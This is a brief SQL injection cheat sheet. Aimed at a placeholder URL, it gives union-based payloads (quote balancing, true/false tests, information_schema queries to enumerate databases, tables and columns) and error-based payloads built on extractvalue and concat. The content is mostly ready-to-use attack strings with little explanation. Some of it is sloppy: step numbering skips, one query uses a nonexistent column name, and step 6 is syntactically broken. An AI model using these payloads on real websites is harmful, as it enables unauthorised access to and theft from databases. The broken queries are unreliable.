<h1>SQL Injection</h1>

SQLi is a server side web security vulnerability.SQLi occurs when user supplied data is passing in SQL querry without sanitization.

Union based SQL Injection
=========================
 
Let's assume, vulnerable URL is:

     http://b0x.com/vulnerable.php?id=1
1 . Balance the query

     http://b0x.com/vulnerable.php?id=1'-- -
   
     http://b0x.com/vulnerable.php?id=1--
2 . Checking true false condition by using below mentioned payloads 

     http://b0x.com/vulnerable.php?id=1' and 1=1-- -
     http://b0x.com/vulnerable.php?id=1' and 1=2-- -
     
     http://b0x.com/vulnerable.php?id=1' and 1='1
     http://b0x.com/vulnerable.php?id=1' and 1='2     
4. Finding columns
5. Invalidating output of first query.
6. Using union select 1,2 — -  ——>Union select 1,table_name,3 from information_schema.tables where table_schema=‘mysql’ table_name=‘user’

<b>Find the table name</b> 

    Select table_name from information_schema.tables where table_schema=database()


<b>extract column names</b>

To find column name from specify table and database

    Select column_name from information_schema.columns where table_schema='security' and table_name='user'
To find column name from specify table of current database

    Select column_name from information_schema.columns where table_schema=database() and table_name='user'

<b>Finding the list of databases</b>

Select group_concat(schema_schema) from information_schema.schemata

Error based SQL Injection
=========================

->and extractvalue(1,concat(0x7e,user()))

->We can’t use direct select statement  in this function we have to make it inline query….

and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))

->Here we make it inline query by injecting in (____) field.



